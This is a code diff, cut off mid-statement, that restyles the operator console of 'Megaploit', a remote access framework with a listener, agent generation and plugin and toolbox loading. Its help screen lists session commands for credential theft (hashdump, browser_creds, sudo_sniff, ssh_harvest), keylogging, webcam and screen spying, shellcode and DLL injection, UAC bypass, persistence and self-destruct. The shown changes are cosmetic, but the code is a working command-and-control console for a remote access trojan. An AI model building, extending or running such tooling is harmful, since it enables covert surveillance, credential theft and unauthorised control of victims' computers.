@@ -5,7 +5,7 @@ Metasploit-style interactive C2 console.
 
 Features
 --------
-* Animated ASCII banner on startup
+* Animated gradient ASCII banner on startup
 * Colour-coded prompt that changes between global context and session context
 * Spinner animation while waiting for a connection
 * `sessions` command to list/switch between multiple simultaneous sessions
@@ -45,22 +45,31 @@ from megaploit.plugins.loader import plugin_loader as _plugin_loader
 from megaploit.plugins.runner import run_plugin_command as _run_plugin_cmd
 
 # ---------------------------------------------------------------------------
-# ANSI colour helpers
+# ANSI colour / style helpers
 # ---------------------------------------------------------------------------
 
-_RESET  = "\033[0m"
-_BOLD   = "\033[1m"
-_DIM    = "\033[2m"
-_RED    = "\033[91m"
-_GREEN  = "\033[92m"
-_YELLOW = "\033[93m"
-_BLUE   = "\033[94m"
-_CYAN   = "\033[96m"
-_WHITE  = "\033[97m"
-_GREY   = "\033[90m"
+_RESET   = "\033[0m"
+_BOLD    = "\033[1m"
+_DIM     = "\033[2m"
+_ITALIC  = "\033[3m"
+_UL      = "\033[4m"        # underline
+
+# Standard foreground colours
+_RED     = "\033[91m"
+_GREEN   = "\033[92m"
+_YELLOW  = "\033[93m"
+_BLUE    = "\033[94m"
+_MAGENTA = "\033[95m"
+_CYAN    = "\033[96m"
+_WHITE   = "\033[97m"
+_GREY    = "\033[90m"
+
+# 256-colour palette helpers  (fall back gracefully on limited terminals)
+def _fg256(n: int, text: str) -> str:
+    return f"\033[38;5;{n}m{text}{_RESET}"
 
 def _c(text: str, *codes: str) -> str:
-    """Wrap *text* in ANSI codes, reset at end."""
+    """Wrap *text* in ANSI escape codes, reset at end."""
     return "".join(codes) + text + _RESET
 
 
@@ -71,44 +80,133 @@ def warn(msg: str) -> str: return _c(f"[!] {msg}", _YELLOW)
 
 
 # ---------------------------------------------------------------------------
-# ASCII banner
+# Layout helpers  (boxes, rules, padding)
 # ---------------------------------------------------------------------------
 
-_BANNER_FRAMES = [
-"""
-  ███╗   ███╗███████╗ ██████╗  █████╗ ██████╗ ██╗      ██████╗ ██╗████████╗
-  ████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
-  ██╔████╔██║█████╗  ██║  ███╗███████║██████╔╝██║     ██║   ██║██║   ██║   
-  ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   
-  ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║██║     ███████╗╚██████╔╝██║   ██║   
-  ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
-""",
+_TW = 78   # target terminal width
+
+def _rule(char: str = "─", width: int = _TW, color: str = _GREY) -> str:
+    return _c("  " + char * (width - 2), color)
+
+def _box_top(title: str, width: int = _TW, color: str = _CYAN) -> str:
+    inner = width - 4
+    title_str = f" {title} "
+    pad = inner - len(title_str)
+    left = pad // 2
+    right = pad - left
+    return _c(f"  ╭{'─' * left}{title_str}{'─' * right}╮", color)
+
+def _box_bot(width: int = _TW, color: str = _CYAN) -> str:
+    return _c(f"  ╰{'─' * (width - 4)}╯", color)
+
+def _box_row(text: str, width: int = _TW, color: str = _CYAN) -> str:
+    inner = width - 4
+    # strip ANSI for length measurement
+    visible = re.sub(r'\033\[[0-9;]*m', '', text)
+    pad = max(0, inner - len(visible))
+    return _c("  │", color) + text + " " * pad + _c("│", color)
+
+
+def _section(title: str, color: str = _CYAN) -> str:
+    """Return a compact section header line."""
+    bar = "━" * 3
+    return f"\n  {_c(bar, color)} {_c(title, _BOLD, color)} {_c(bar, color)}"
+
+
+def _kv(key: str, val: str, kw: int = 18) -> str:
+    return f"  {_c(key + ':', _GREY):<{kw + 8}}  {val}"
+
+
+# ---------------------------------------------------------------------------
+# Progress bar  (used during toolbox install)
+# ---------------------------------------------------------------------------
+
+class _ProgressBar:
+    """
+    A simple inline progress bar that overwrites itself on the same line.
+    Driven externally by calling .step() or .set_label().
+    """
+    _BAR_WIDTH = 30
+
+    def __init__(self, total: int = 100, label: str = "") -> None:
+        self._total   = max(total, 1)
+        self._current = 0
+        self._label   = label
+        self._done    = False
+
+    def set_label(self, label: str) -> None:
+        self._label = label
+        self._render()
+
+    def step(self, n: int = 1) -> None:
+        self._current = min(self._current + n, self._total)
+        self._render()
+
+    def finish(self) -> None:
+        self._current = self._total
+        self._render()
+        sys.stdout.write("\n")
+        sys.stdout.flush()
+        self._done = True
+
+    def _render(self) -> None:
+        if self._done:
+            return
+        pct  = self._current / self._total
+        fill = int(pct * self._BAR_WIDTH)
+        bar  = _c("█" * fill, _CYAN) + _c("░" * (self._BAR_WIDTH - fill), _GREY)
+        pct_str = _c(f"{int(pct * 100):>3}%", _BOLD, _WHITE)
+        label = self._label[:30].ljust(30)
+        line  = f"\r  {bar} {pct_str}  {_c(label, _GREY)} "
+        sys.stdout.write(line)
+        sys.stdout.flush()
+
+
+# ---------------------------------------------------------------------------
+# ASCII banner  (gradient red → dim)
+# ---------------------------------------------------------------------------
+
+_BANNER_LINES = [
+    r"  ███╗   ███╗███████╗ ██████╗  █████╗ ██████╗ ██╗      ██████╗ ██╗████████╗",
+    r"  ████╗ ████║██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
+    r"  ██╔████╔██║█████╗  ██║  ███╗███████║██████╔╝██║     ██║   ██║██║   ██║   ",
+    r"  ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║██╔═══╝ ██║     ██║   ██║██║   ██║   ",
+    r"  ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║██║     ███████╗╚██████╔╝██║   ██║   ",
+    r"  ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝  ",
 ]
 
-_SUBTITLE = "  Professional Remote Access Framework  |  v2.0.0  |  For Authorized Use Only"
-_DIVIDER  = "  " + "─" * 74
+# 256-colour gradient: bright red → dark red per line
+_BANNER_COLOURS = [196, 160, 124, 88, 52, 238]
+
+_VERSION  = "v2.0.0"
+_SUBTITLE = "Professional Remote Access Framework"
+_TAGLINE  = "For Authorized Use Only"
 
 
 def _print_banner() -> None:
     os.system("cls" if os.name == "nt" else "clear")
-    for frame in _BANNER_FRAMES:
-        print(_c(frame, _RED, _BOLD))
-        time.sleep(0.04)
-    print(_c(_SUBTITLE, _GREY))
-    print(_c(_DIVIDER, _GREY))
+    print()
+    for line, col in zip(_BANNER_LINES, _BANNER_COLOURS):
+        print(_fg256(col, line))
+        time.sleep(0.045)
+    print()
+    # Centred subtitle row
+    subtitle = f"  {_c(_SUBTITLE, _BOLD, _WHITE)}  {_c('│', _GREY)}  {_c(_VERSION, _CYAN)}  {_c('│', _GREY)}  {_c(_TAGLINE, _GREY)}"
+    print(subtitle)
+    print(_rule("─", color=_GREY))
     print()
 
 
 # ---------------------------------------------------------------------------
-# Spinner
+# Spinner  (braille + label)
 # ---------------------------------------------------------------------------
 
 class _Spinner:
     _FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
 
     def __init__(self, message: str) -> None:
-        self._msg = message
-        self._stop = threading.Event()
+        self._msg    = message
+        self._stop   = threading.Event()
         self._thread = threading.Thread(target=self._run, daemon=True)
 
     def __enter__(self):
@@ -118,34 +216,38 @@ class _Spinner:
     def __exit__(self, *_):
         self._stop.set()
         self._thread.join()
-        # Clear the spinner line
-        sys.stdout.write("\r" + " " * (len(self._msg) + 10) + "\r")
+        sys.stdout.write("\r" + " " * (_TW) + "\r")
         sys.stdout.flush()
 
-    def _run(self):
+    def _run(self) -> None:
         i = 0
         while not self._stop.is_set():
-            frame = self._FRAMES[i % len(self._FRAMES)]
-            sys.stdout.write(f"\r  {_c(frame, _CYAN)} {_c(self._msg, _GREY)} ")
+            frame = _c(self._FRAMES[i % len(self._FRAMES)], _CYAN)
+            label = _c(self._msg, _GREY)
+            elapsed = _c(f"{(i * 0.08):.1f}s", _DIM)
+            sys.stdout.write(f"\r  {frame}  {label}  {elapsed}  ")
             sys.stdout.flush()
             time.sleep(0.08)
             i += 1
 
 
 # ---------------------------------------------------------------------------
-# Session table printer
+# Session table
 # ---------------------------------------------------------------------------
 
 def _print_sessions(sessions: dict[int, Session]) -> None:
     if not sessions:
-        print(info("No active sessions."))
+        print(f"\n  {_c('No active sessions.', _GREY)}\n")
         return
-    header = f"  {'ID':<5} {'IP':<18} {'PORT':<8} {'UPTIME':<12}"
     print()
-    print(_c(header, _BOLD, _WHITE))
-    print(_c("  " + "─" * 46, _GREY))
+    cols = f"  {'ID':<5} {'IP ADDRESS':<20} {'PORT':<8} {'UPTIME':<14} {'STATUS'}"
+    print(_c(cols, _BOLD, _WHITE))
+    print(_rule("─"))
     for sid, sess in sessions.items():
-        print(f"  {_c(str(sid), _CYAN):<14} {_c(sess.ip, _WHITE):<27} {sess.port:<8} {sess.uptime}")
+        dot    = _c("●", _GREEN)
+        id_str = _c(str(sid), _CYAN, _BOLD)
+        ip_str = _c(sess.ip, _WHITE)
+        print(f"  {id_str:<14} {ip_str:<29} {sess.port:<8} {sess.uptime:<14} {dot} active")
     print()
 
 
@@ -160,9 +262,8 @@ _GLOBAL_CMDS  = [
 _SESSION_CMDS = list(all_commands().keys()) + ["back", "clear"]
 
 def _completer(text: str, state: int) -> Optional[str]:
-    # Combined pool: global + session + installed tools + plugin commands
-    tool_names   = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
-    plugin_cmds  = _plugin_loader.all_command_names()
+    tool_names  = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
+    plugin_cmds = _plugin_loader.all_command_names()
     pool = _GLOBAL_CMDS + _SESSION_CMDS + tool_names + plugin_cmds
     options = [c for c in pool if c.startswith(text)]
     return options[state] if state < len(options) else None
@@ -177,9 +278,7 @@ if _HAS_READLINE:
 # ---------------------------------------------------------------------------
 
 class Console:
-    """
-    The interactive operator console.  Call run() to start.
-    """
+    """The interactive operator console.  Call run() to start."""
 
     def __init__(self) -> None:
         self._sessions: dict[int, Session] = {}
@@ -188,15 +287,14 @@ class Console:
         self._listener: Optional[Listener] = None
         self._updater: Optional[_UpdateChecker] = None
 
-        # Server config (set via 'set' or CLI args)
-        self.bind_host:   str  = "0.0.0.0"
-        self.lhost:       str  = ""
-        self.port:        int  = 4444
-        self.cert:        str  = ""
-        self.key_file:    str  = ""
+        self.bind_host:   str   = "0.0.0.0"
+        self.lhost:       str   = ""
+        self.port:        int   = 4444
+        self.cert:        str   = ""
+        self.key_file:    str   = ""
         self.secret_key:  bytes = b""
-        self.allowed_ips: list[str] = []   # empty = allow all
-        self.auto_update: bool = False
+        self.allowed_ips: list[str] = []
+        self.auto_update: bool  = False
 
     # ---------------------------------------------------------------
     # Entry point
@@ -207,6 +305,7 @@ class Console:
             secret_key_path: str = "secret.key",
             allowed_ips: list[str] | None = None,
             auto_update: bool = False) -> None:
+
         self.bind_host   = bind_host
         self.lhost       = lhost
         self.port        = port
@@ -217,13 +316,23 @@ class Console:
         self.auto_update = auto_update
 
         _print_banner()
+
+        # ── startup info box ──────────────────────────────────────
         fp = key_fingerprint(self.secret_key)
-        print(info(f"Key fingerprint : {fp[:8]} {fp[8:]}"))
-        if self.allowed_ips:
-            print(ok(f"IP allowlist    : {', '.join(self.allowed_ips)}"))
-        else:
-            print(warn("IP allowlist    : disabled (any IP may attempt auth)"))
+        tls_val  = _c(f"{cert}", _GREEN) if cert else _c("disabled", _YELLOW)
+        upd_val  = _c("on (auto)", _GREEN) if auto_update else _c("notify only", _GREY)
+        ip_val   = _c(", ".join(allowed_ips), _GREEN) if allowed_ips else _c("any  ⚠", _YELLOW)
+
+        print(_box_top("Server Configuration"))
+        print(_box_row(_kv("LHOST",       _c(lhost, _CYAN))))
+        print(_box_row(_kv("Port",        _c(str(port), _CYAN))))
+        print(_box_row(_kv("TLS",         tls_val)))
+        print(_box_row(_kv("IP allowlist",ip_val)))
+        print(_box_row(_kv("Auto-update", upd_val)))
+        print(_box_row(_kv("Key fprint",  _c(f"{fp[:8]} {fp[8:]}", _DIM))))
+        print(_box_bot())
         print()
+
         self._start_updater()
         self._load_plugins()
         self._start_listener()
@@ -247,8 +356,8 @@ class Console:
     def _start_updater(self) -> None:
         self._updater = _UpdateChecker(megaploit_dir=".", auto_update=self.auto_update)
         self._updater.start()
-        mode = "auto-update ON" if self.auto_update else "notify only"
-        print(info(f"Update checker started (checks every 5 min, {mode})"))
+        mode = _c("auto-update ON", _GREEN) if self.auto_update else _c("notify only", _GREY)
+        print(info(f"Update checker started — {mode}"))
 
     def _drain_updates(self) -> None:
         if self._updater is None:
@@ -265,12 +374,12 @@ class Console:
         if self.cert and self.key_file:
             try:
                 ssl_ctx = build_ssl_context(self.cert, self.key_file)
-                print(ok(f"TLS configured ({self.cert}) — TLS 1.2+ AEAD only"))
+                print(ok(f"TLS enabled  ({self.cert})"))
             except ssl.SSLError as e:
                 print(err(f"TLS error: {e}"))
                 sys.exit(1)
         else:
-            print(warn("TLS not configured — traffic is unencrypted. Use --cert/--key for production."))
+            print(warn("TLS not configured — traffic is unencrypted."))
 
         self._listener = Listener(
             bind_host=self.bind_host,
@@ -281,8 +390,8 @@ class Console:
             allowed_ips=self.allowed_ips or None,
         )
         self._listener.start()
-        print(ok(f"Listener started on {self.bind_host}:{self.port}"))
-        print(info(f"Waiting for agents to connect back to {self.lhost}:{self.port}"))
+        print(ok(f"Listener ready on {_c(self.bind_host, _CYAN)}:{_c(str(self.port), _CYAN)}"))
+        print(info(f"Agents should call back to  {_c(self.lhost, _WHITE)}:{_c(str(self.port), _WHITE)}"))
         print()
 
     def _on_new_session(self, session: Session) -> None:
@@ -291,20 +400,22 @@ class Console:
         self._new_sessions.put(session)
 
     # ---------------------------------------------------------------
-    # New-session notification (printed between prompts)
+    # New-session notification
     # ---------------------------------------------------------------
 
     def _drain_new_sessions(self) -> None:
         while not self._new_sessions.empty():
             try:
                 sess = self._new_sessions.get_nowait()
+                # Draw an eye-catching alert box
                 print()
-                print(ok(f"New session #{sess.id} opened — {sess.ip}:{sess.port}"))
-                print(info(f"  Type  use {sess.id}  to interact"))
+                print(_box_top(f"  ★  NEW SESSION  #{sess.id}  ★  ", color=_GREEN))
+                print(_box_row(_kv("Address", _c(f"{sess.ip}:{sess.port}", _WHITE)), color=_GREEN))
+                print(_box_row(_kv("Interact", _c(f"use {sess.id}", _CYAN, _BOLD)),  color=_GREEN))
+                print(_box_bot(color=_GREEN))
                 print()
             except queue.Empty:
                 break
-        # Also drain update notifications alongside new sessions
         self._drain_updates()
 
     # ---------------------------------------------------------------
@@ -312,11 +423,20 @@ class Console:
     # ---------------------------------------------------------------
 
     def _global_loop(self) -> None:
-        print(info("Type  help  for available commands.\n"))
+        print(f"  {_c('Type', _GREY)} {_c('help', _CYAN)} {_c('for commands.', _GREY)}\n")
         while True:
             self._drain_new_sessions()
             try:
-                prompt = f"\n{_c('megaploit', _RED, _BOLD)} {_c('>', _GREY)} "
+                n_sessions = len(self._sessions)
+                sess_badge = (
+                    _c(f"[{n_sessions}]", _GREEN, _BOLD)
+                    if n_sessions else _c("[0]", _GREY)
+                )
+                prompt = (
+                    f"\n{_c('msf', _GREY)}{_c('►', _RED, _BOLD)}"
+                    f"{_c('megaploit', _RED, _BOLD)} "
+                    f"{sess_badge} {_c('»', _GREY)} "
+                )
                 raw = input(prompt).strip()
             except (EOFError, KeyboardInterrupt):
                 print()
@@ -327,50 +447,39 @@ class Console:
                 continue
 
             parts = raw.split()
-            cmd = parts[0].lower()
-            args = parts[1:]
+            cmd   = parts[0].lower()
+            args  = parts[1:]
 
             if cmd == "exit":
                 self._shutdown()
                 return
-
             elif cmd in ("help", "?"):
                 self._global_help()
-
             elif cmd == "clear":
                 os.system("cls" if os.name == "nt" else "clear")
-
             elif cmd == "sessions":
                 with self._sessions_lock:
                     _print_sessions(dict(self._sessions))
-
             elif cmd == "use":
                 self._cmd_use(args)
-
             elif cmd == "generate":
                 self._cmd_generate(args)
-
             elif cmd == "set":
                 self._cmd_set(args)
-
             elif cmd == "toolbox":
                 self._cmd_toolbox(args)
-
             elif cmd in ("toolbox_run", "toolbox_deploy"):
                 print(warn(f"  '{cmd}' must be run inside a session."))
-                print(info("  Type  use <id>  to enter a session, then run:"))
-                print(f"  {cmd} {' '.join(args) if args else '<tool-name>'}")
-
+                print(info(f"  Type  use <id>  to enter a session, then run:"))
+                print(f"  {_c(cmd, _CYAN)} {' '.join(args) if args else _c('<tool-name>', _GREY)}")
             elif cmd == "plugins":
                 self._cmd_plugins(args)
-
             elif _plugin_loader.is_plugin_command(cmd):
-                pc = _plugin_loader.get_command(cmd)
+                pc     = _plugin_loader.get_command(cmd)
                 result = _run_plugin_cmd(pc, args, lhost=self.lhost, port=self.port)
                 self._print_result(result)
-
             else:
-                print(err(f"Unknown command: {cmd}  (type help)"))
+                print(err(f"Unknown command: {_c(cmd, _BOLD)}  — type {_c('help', _CYAN)}"))
 
     # ---------------------------------------------------------------
     # Session interaction loop
@@ -378,16 +487,22 @@ class Console:
 
     def _session_loop(self, session: Session) -> None:
         print()
-        print(ok(f"Interacting with session #{session.id} ({session.ip})"))
-        print(info("Type  help  for commands,  back  to return.\n"))
+        print(_rule("─", color=_CYAN))
+        print(f"  {_c('●', _GREEN)} Session {_c(f'#{session.id}', _CYAN, _BOLD)}  "
+              f"{_c(session.ip, _WHITE)}  "
+              f"{_c('— type  back  to return', _GREY)}")
+        print(_rule("─", color=_CYAN))
+        print()
 
         while True:
             self._drain_new_sessions()
             try:
                 prompt = (
-                    f"\n{_c('megaploit', _RED, _BOLD)}"
-                    f" {_c('session', _GREY)}({_c(str(session.id), _CYAN)})"
-                    f"{_c('>', _GREY)} "
+                    f"\n{_c('msf', _GREY)}{_c('►', _RED, _BOLD)}"
+                    f"{_c('megaploit', _RED, _BOLD)}"
+                    f" {_c('session', _GREY)}"
+                    f"{_c('(', _GREY)}{_c(str(session.id), _CYAN, _BOLD)}{_c(')', _GREY)}"
+                    f" {_c('»', _GREY)} "
                 )
                 raw = input(prompt).strip()
             except (EOFError, KeyboardInterrupt):
@@ -397,24 +512,26 @@ class Console:
             if not raw:
                 continue
 
-            parts = raw.split()
+            parts    = raw.split()
             cmd_name = parts[0].lower()
-            args = parts[1:]
+            args     = parts[1:]
 
             if cmd_name == "back":
+                print(_rule("─", color=_GREY))
                 return
 
             if cmd_name == "clear":
                 os.system("cls" if os.name == "nt" else "clear")
                 continue
 
-            # Redirect toolbox management commands to the global context
             if cmd_name == "toolbox":
                 print(warn("  'toolbox' is a global command — type  back  first, then use:"))
-                print(f"  toolbox install <url> <name>  /  toolbox list  /  toolbox info <name>")
+                print(f"  {_c('toolbox install <url> <name>', _CYAN)}  /  "
+                      f"{_c('toolbox list', _CYAN)}  /  "
+                      f"{_c('toolbox info <name>', _CYAN)}")
                 continue
 
-            # Dangerous command confirmation — built-in and plugin commands
+            # Dangerous command confirmation
             cmds = all_commands()
             is_dangerous = (
                 (cmd_name in cmds and cmds[cmd_name].dangerous)
@@ -424,14 +541,15 @@ class Console:
                 )
             )
             if is_dangerous:
-                confirm = input(warn(f"  {cmd_name} is dangerous. Type YES to confirm: ")).strip()
+                print()
+                print(_c(f"  ⚠  '{cmd_name}' is a destructive operation.", _YELLOW, _BOLD))
+                confirm = input(_c("     Type YES to confirm: ", _YELLOW)).strip()
                 if confirm != "YES":
                     print(warn("  Cancelled."))
                     continue
 
-            # Plugin session commands take priority over the C2 dispatcher
             if _plugin_loader.is_plugin_command(cmd_name):
-                pc = _plugin_loader.get_command(cmd_name)
+                pc     = _plugin_loader.get_command(cmd_name)
                 result = _run_plugin_cmd(
                     pc, args,
                     session=session,
@@ -465,11 +583,11 @@ class Console:
         if not result.output:
             return
         if result.ok:
-            # Colour [+] green, [-] red, [*] cyan within the output
             out = result.output
-            out = re.sub(r"^\[\+\]", _c("[+]", _GREEN), out, flags=re.MULTILINE)
-            out = re.sub(r"^\[-\]", _c("[-]", _RED),   out, flags=re.MULTILINE)
-            out = re.sub(r"^\[\*\]", _c("[*]", _CYAN),  out, flags=re.MULTILINE)
+            out = re.sub(r"^\[\+\]", _c("[+]", _GREEN),  out, flags=re.MULTILINE)
+            out = re.sub(r"^\[-\]",  _c("[-]", _RED),    out, flags=re.MULTILINE)
+            out = re.sub(r"^\[\*\]", _c("[*]", _CYAN),   out, flags=re.MULTILINE)
+            out = re.sub(r"^\[!\]",  _c("[!]", _YELLOW), out, flags=re.MULTILINE)
             print(out)
         else:
             print(err(result.output))
@@ -491,7 +609,6 @@ class Console:
         self._session_loop(session)
 
     def _cmd_generate(self, args: list[str]) -> None:
-        """Patch agent.py with LHOST/PORT/USE_TLS and optionally byte-compile it."""
         if not self.lhost or not self.port:
             print(err("Set LHOST and PORT first:  set lhost <ip>  /  set port <port>"))
             return
@@ -512,112 +629,121 @@ class Console:
         key, val = args[0].lower(), args[1]
         if key == "lhost":
             self.lhost = val
-            print(ok(f"lhost => {val}"))
+            print(ok(f"lhost  →  {_c(val, _CYAN)}"))
         elif key == "port":
             try:
                 self.port = int(val)
-                print(ok(f"port => {val}"))
+                print(ok(f"port  →  {_c(val, _CYAN)}"))
             except ValueError:
                 print(err("port must be an integer"))
         elif key == "cert":
             self.cert = val
-            print(ok(f"cert => {val}"))
+            print(ok(f"cert  →  {_c(val, _CYAN)}"))
         elif key == "key":
             self.key_file = val
-            print(ok(f"key => {val}"))
+            print(ok(f"key  →  {_c(val, _CYAN)}"))
         elif key == "auto_update":
             if val.lower() in ("on", "true", "1", "yes"):
                 self.auto_update = True
                 if self._updater:
                     self._updater.auto_update = True
-                print(ok("auto_update => on  (tools will be updated automatically)"))
+                print(ok(f"auto_update  →  {_c('on', _GREEN)}  (tools update automatically)"))
             elif val.lower() in ("off", "false", "0", "no"):
                 self.auto_update = False
                 if self._updater:
                     self._updater.auto_update = False
-                print(ok("auto_update => off  (update notifications only)"))
+                print(ok(f"auto_update  →  {_c('off', _GREY)}  (notifications only)"))
             else:
-                print(err("auto_update must be on or off"))
+                print(err("auto_update must be  on  or  off"))
         else:
-            print(err(f"Unknown option: {key}"))
+            print(err(f"Unknown option: {_c(key, _BOLD)}"))
 
     # ---------------------------------------------------------------
-    # Help screens
+    # Help screen
     # ---------------------------------------------------------------
 
     def _global_help(self) -> None:
-        tools = _tool_registry.all()
+        tools   = _tool_registry.all()
+        plugins = _plugin_loader.plugins()
+
+        def _cmd_row(cmd: str, desc: str) -> str:
+            return f"  {_c(cmd, _CYAN):<{32 + 9}}  {_c(desc, _GREY)}"
+
+        def _opt_row(key: str, val: str) -> str:
+            val_col = _c(val, _WHITE) if val not in ("(not set)", "(none)", "off") else _c(val, _DIM)
+            return f"  {_c(key, _YELLOW):<{16 + 9}}  {val_col}"
+
         lines = [
             "",
-            _c("  Global Commands", _BOLD, _WHITE),
-            _c("  " + "─" * 55, _GREY),
-            f"  {'sessions':<32}  List active sessions",
-            f"  {'use <id>':<32}  Interact with a session",
-            f"  {'generate [-c] [--tls]':<32}  Patch agent.py; -c compiles, --tls enables TLS",
-            f"  {'set <opt> <val>':<32}  Set lhost / port / cert / key / auto_update",
-            f"  {'toolbox install <url> <name>':<32}  Install a GitHub tool",
-            f"  {'toolbox list':<32}  Show installed tools",
-            f"  {'toolbox search <query>':<32}  Search installed tools",
-            f"  {'toolbox info <name>':<32}  Show tool details",
-            f"  {'toolbox update <name>':<32}  Pull latest changes",
-            f"  {'toolbox remove <name>':<32}  Uninstall a tool",
-            f"  {'toolbox set-entry <name> <path>':<32}  Override entry-point",
-            f"  {'clear':<32}  Clear the terminal",
-            f"  {'exit':<32}  Quit Megaploit",
+            _section("Global Commands"),
             "",
-            _c("  Options", _BOLD, _WHITE),
-            _c("  " + "─" * 55, _GREY),
-            f"  {'lhost':<32}  {self.lhost or '(not set)'}",
-            f"  {'port':<32}  {self.port}",
-            f"  {'cert':<32}  {self.cert or '(none)'}",
-            f"  {'key':<32}  {self.key_file or '(none)'}",
-            f"  {'auto_update':<32}  {'on' if self.auto_update else 'off'}",
+            _cmd_row("sessions",                    "List active sessions"),
+            _cmd_row("use <id>",                    "Interact with a session"),
+            _cmd_row("generate [-c] [--tls]",       "Patch agent.py  (-c compile, --tls enable TLS)"),
+            _cmd_row("set <option> <value>",        "Set lhost / port / cert / key / auto_update"),
+            _cmd_row("toolbox install <url> <name>","Install a GitHub tool"),
+            _cmd_row("toolbox list",                "Show installed tools"),
+            _cmd_row("toolbox search <query>",      "Search tools by name / tag / description"),
+            _cmd_row("toolbox info <name>",         "Show tool details"),
+            _cmd_row("toolbox update <name>",       "Pull latest changes"),
+            _cmd_row("toolbox rebuild <name>",      "Re-build in place (no pull)"),
+            _cmd_row("toolbox remove <name>",       "Uninstall a tool"),
+            _cmd_row("toolbox set-entry <name> <p>","Override the entry-point path"),
+            _cmd_row("plugins [reload|info]",       "Manage loaded plugins"),
+            _cmd_row("clear",                       "Clear the terminal"),
+            _cmd_row("exit",                        "Quit Megaploit"),
             "",
-            _c("  Session Commands (inside  use <id> )", _BOLD, _WHITE),
-            _c("  " + "─" * 55, _GREY),
-            f"  {'File transfer':<32}  upload  download  zip_download",
-            f"  {'Screen / audio':<32}  screenshot  screenshot_timelapse  record  mic_level",
-            f"  {'Screen record':<32}  screenrecord <secs>",
-            f"  {'Streaming':<32}  screen_stream  webcam",
-            f"  {'Credentials':<32}  hashdump  wifi_passwords  browser_history",
-            f"  {'Browser':<32}  browser_creds [cookies|passwords|all]",
-            f"  {'Adv. creds':<32}  cred_vault  ssh_harvest  sudo_sniff",
-            f"  {'Search':<32}  search <path> <keyword>",
-            f"  {'Clipboard':<32}  getclip  setclip",
-            f"  {'Network pivot':<32}  portfwd  socks5  reverse_shell [!]",
-            f"  {'Awareness':<32}  idle_time  sysinfo  mic_level",
-            f"  {'GUI / input':<32}  msgbox  mouse_move  type_keys  lock_screen",
-            f"  {'Injection':<32}  inject_shellcode [!]  dll_inject [!]",
-            f"  {'Priv. esc.':<32}  uac_bypass [!]  token_steal [!]",
-            f"  {'LOLBins':<32}  living_off_land [!]",
-            f"  {'Persistence':<32}  persist  keylog_start/dump/stop",
-            f"  {'Cleanup':<32}  self_destruct [!]",
-            f"  {'Toolbox':<32}  toolbox_run <name>  toolbox_deploy <name>",
-            f"  {'Shell passthrough':<32}  any unrecognised command runs as shell",
+            _section("Options"),
+            "",
+            _opt_row("lhost",        self.lhost or "(not set)"),
+            _opt_row("port",         str(self.port)),
+            _opt_row("cert",         self.cert or "(none)"),
+            _opt_row("key",          self.key_file or "(none)"),
+            _opt_row("auto_update",  "on" if self.auto_update else "off"),
+            "",
+            _section("Session Commands  (inside  use <id>)"),
+            "",
+            _cmd_row("File transfer",   "upload  download  zip_download"),
+            _cmd_row("Screen / audio",  "screenshot  screenshot_timelapse  record  mic_level"),
+            _cmd_row("Screen record",   "screenrecord <secs>"),
+            _cmd_row("Streaming",       "screen_stream  webcam"),
+            _cmd_row("Credentials",     "hashdump  wifi_passwords  browser_history"),
+            _cmd_row("Browser",         "browser_creds [cookies|passwords|all]"),
+            _cmd_row("Adv. creds",      "cred_vault  ssh_harvest  sudo_sniff"),
+            _cmd_row("Search",          "search <path> <keyword>"),
+            _cmd_row("Clipboard",       "getclip  setclip"),
+            _cmd_row("Network pivot",   "portfwd  socks5  " + _c("reverse_shell [!]", _YELLOW)),
+            _cmd_row("Awareness",       "idle_time  sysinfo  mic_level"),
+            _cmd_row("GUI / input",     "msgbox  mouse_move  type_keys  lock_screen"),
+            _cmd_row("Injection",       _c("inject_shellcode [!]  dll_inject [!]", _YELLOW)),
+            _cmd_row("Priv. esc.",      _c("uac_bypass [!]  token_steal [!]", _YELLOW)),
+            _cmd_row("LOLBins",         _c("living_off_land [!]", _YELLOW)),
+            _cmd_row("Persistence",     "persist  keylog_start/dump/stop"),
+            _cmd_row("Cleanup",         _c("self_destruct [!]", _YELLOW)),
+            _cmd_row("Toolbox",         "toolbox_run <name>  toolbox_deploy <name>"),
+            _cmd_row("Shell passthrough","any unrecognised command runs as shell"),
             "",
         ]
+
         if tools:
-            lines += [
-                _c("  Installed Tools", _BOLD, _WHITE),
-                _c("  " + "─" * 50, _GREY),
-            ]
+            lines += [_section("Installed Tools"), ""]
             for t in tools:
-                status = _c("✔", _GREEN) if t.is_installed else _c("✘", _RED)
-                lines.append(f"  {status} {_c(t.name, _CYAN):<22}  {t.description[:55]}")
+                dot    = _c("●", _GREEN) if t.is_installed else _c("○", _RED)
+                lang   = _c(f"[{t.lang}]", _DIM)
+                desc   = t.description[:48] + ("…" if len(t.description) > 48 else "")
+                lines.append(
+                    f"  {dot} {_c(t.name, _CYAN, _BOLD):<{20 + 9}}  {lang:<{10 + 9}}  {_c(desc, _GREY)}"
+                )
             lines.append("")
 
-        plugins = _plugin_loader.plugins()
         if plugins:
-            lines += [
-                _c("  Loaded Plugins", _BOLD, _WHITE),
-                _c("  " + "─" * 50, _GREY),
-            ]
+            lines += [_section("Loaded Plugins"), ""]
             for p in plugins:
-                ncmds = len(p.commands)
+                ncmds = _c(f"{len(p.commands)} cmd", _DIM)
+                desc  = p.description[:42] + ("…" if len(p.description) > 42 else "")
                 lines.append(
-                    f"  {_c(p.name, _CYAN):<22}  v{p.version}  "
-                    f"{_c(p.description[:40], _GREY)}  "
-                    f"{_c(f'({ncmds} cmd)', _DIM)}"
+                    f"  {_c('◆', _MAGENTA)} {_c(p.name, _CYAN):<{20 + 9}}  "
